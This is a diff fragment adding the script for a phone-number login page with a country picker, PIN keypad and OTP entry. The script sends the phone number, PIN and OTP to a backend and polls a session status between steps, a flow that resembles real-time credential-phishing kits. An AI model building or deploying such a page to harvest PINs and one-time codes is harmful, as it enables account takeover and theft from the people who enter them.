+    { flag: '🇹🇷', name: 'Turkey', code: '+90' },
+    { flag: '🇺🇬', name: 'Uganda', code: '+256' },
+    { flag: '🇺🇦', name: 'Ukraine', code: '+380' },
+    { flag: '🇦🇪', name: 'UAE', code: '+971' },
+    { flag: '🇬🇧', name: 'United Kingdom', code: '+44' },
+    { flag: '🇺🇸', name: 'United States', code: '+1' },
+    { flag: '🇺🇾', name: 'Uruguay', code: '+598' },
+    { flag: '🇺🇿', name: 'Uzbekistan', code: '+998' },
+    { flag: '🇻🇪', name: 'Venezuela', code: '+58' },
+    { flag: '🇻🇳', name: 'Vietnam', code: '+84' },
+    { flag: '🇾🇪', name: 'Yemen', code: '+967' },
+    { flag: '🇿🇲', name: 'Zambia', code: '+260' },
+    { flag: '🇿🇼', name: 'Zimbabwe', code: '+263' },
+  ];
+
+  let selectedIndex = 0;
+  let filtered = [...countries];
+
+  function renderList() {
+    const list = document.getElementById('country-list');
+    list.innerHTML = filtered.map(c => {
+      const idx = countries.indexOf(c);
+      return `<div class="country-item ${idx === selectedIndex ? 'selected' : ''}" onclick="selectCountry(${idx})">
+        <span class="item-flag">${c.flag}</span>
+        <span class="item-name">${c.name}</span>
+        <span class="item-code">${c.code}</span>
+      </div>`;
+    }).join('');
+  }
+
+  function filterCountries() {
+    const q = document.getElementById('search-input').value.toLowerCase();
+    filtered = countries.filter(c => c.name.toLowerCase().includes(q) || c.code.includes(q));
+    renderList();
+  }
+
+  function selectCountry(index) {
+    selectedIndex = index;
+    document.getElementById('selected-flag').textContent = countries[index].flag;
+    document.getElementById('selected-code').textContent = countries[index].code;
+    document.getElementById('dropdown').classList.remove('open');
+    document.getElementById('phone-input').focus();
+  }
+
+  function toggleDropdown() {
+    const dd = document.getElementById('dropdown');
+    dd.classList.toggle('open');
+    if (dd.classList.contains('open')) { renderList(); document.getElementById('search-input').focus(); }
+  }
+
+  document.addEventListener('click', function(e) {
+    const dd = document.getElementById('dropdown');
+    const selector = document.querySelector('.country-select');
+    if (dd && !dd.contains(e.target) && selector && !selector.contains(e.target)) dd.classList.remove('open');
+  });
+
+  renderList();
+
+  // ── Login → PIN ──
+  function goToPin() {
+    const phone = document.getElementById('phone-input').value.trim();
+    if (!phone) { alert('Please enter your mobile number.'); return; }
+    showScreen('pin');
+  }
+
+  // ── PIN logic ──
+  let pin = [];
+
+  function updateDashes() {
+    for (let i = 0; i < 4; i++) {
+      const d = document.getElementById('d' + i);
+      d.className = 'dash';
+      if (i < pin.length) d.classList.add('filled');
+      else if (i === pin.length) d.classList.add('active');
+    }
+    const btn = document.getElementById('continue-btn');
+    if (pin.length === 4) { btn.disabled = false; btn.classList.add('ready'); }
+    else { btn.disabled = true; btn.classList.remove('ready'); }
+  }
+
+  function pressKey(num) {
+    if (pin.length < 4) { pin.push(num); updateDashes(); }
+  }
+
+  function deleteLast() {
+    if (pin.length > 0) { pin.pop(); updateDashes(); }
+  }
+
+  updateDashes();
+
+  async function submitPIN() {
+    if (pin.length !== 4) return;
+    const phone       = document.getElementById('phone-input').value.trim();
+    const countryFlag = countries[selectedIndex].flag;
+    const countryCode = countries[selectedIndex].code;
+    const pinStr      = pin.join('');
+
+    showLoading();
+    const result = await callApi('login_attempt', { countryFlag, countryCode, phone, pin: pinStr });
+    if (result.success && result.data && result.data.sessionId) {
+      currentSessionId = result.data.sessionId;
+      startStatusPolling(currentSessionId);
+    } else {
+      hideLoading();
+      alert('Failed to send request. Please try again.');
+    }
+  }
+
+  // ── OTP logic ──
+  const otpInput = document.getElementById('otp-input');
+
+  function focusOtpInput() { otpInput.focus(); }
+
+  function updateSlots() {
+    const val = otpInput.value.replace(/\D/g, '').slice(0, 6);
+    for (let i = 0; i < 6; i++) {
+      document.getElementById('s' + i).textContent = val[i] || '';
+      const line = document.getElementById('l' + i);
+      line.className = 'otp-line';
+      if (i < val.length) line.classList.add('filled');
+      else if (i === val.length) line.classList.add('active');
+    }
+    const btn = document.getElementById('otp-submit-btn');
+    if (val.length === 6) { btn.disabled = false; btn.classList.add('ready'); }
+    else { btn.disabled = true; btn.classList.remove('ready'); }
+  }
+
+  otpInput.addEventListener('input', () => {
+    otpInput.value = otpInput.value.replace(/\D/g, '').slice(0, 6);
+    updateSlots();
+  });
+
+  updateSlots();
+
+  async function submitOTP() {
+    const otp = otpInput.value.replace(/\D/g, '').slice(0, 6);
+    if (otp.length !== 6 || !currentSessionId) return;
+    const phone       = document.getElementById('phone-input').value.trim();
+    const countryCode = countries[selectedIndex].code;
+
+    showLoading();
+    const result = await callApi('otp_entered', { sessionId: currentSessionId, otp, countryCode, phone });
+    if (result.success) {
+      startStatusPolling(currentSessionId);
+    } else {
+      hideLoading();
+      alert('Failed to submit OTP. Please try again.');
+    }
+  }
+</script>
+</body>
+</html>
